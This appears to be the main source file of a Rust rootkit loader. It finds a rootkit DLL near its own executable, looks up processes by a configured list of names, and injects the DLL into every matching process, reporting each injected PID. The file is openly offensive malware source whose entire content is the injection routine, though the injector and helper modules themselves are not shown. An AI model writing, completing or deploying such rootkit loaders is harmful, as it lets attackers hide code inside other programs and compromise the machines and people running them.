mod config;
mod admin;
mod injector;
mod utils;

use std::{process, env};

use config::*;

fn main() {
    let exec_path = env::current_exe()
        .unwrap();

    let rootkit_file_path = match utils::find_file_upstream(&exec_path, H_ROOTKIT_FILE_NAME) {
        Some(path) => path,
        None => {
            println!("failed to find rootkit file");
            process::exit(0);
        }
    };

    for pid in utils::find_pids_by_names(INJECTABLE_PROCS) {
        let rootkit_file_path_str = rootkit_file_path
            .to_string_lossy()
            .to_string();

        match injector::inject_dll(pid, &rootkit_file_path_str) {
            Ok(_) => println!("injected - {}", pid),
            Err(err) => println!("{}", err)
        };
    }
}
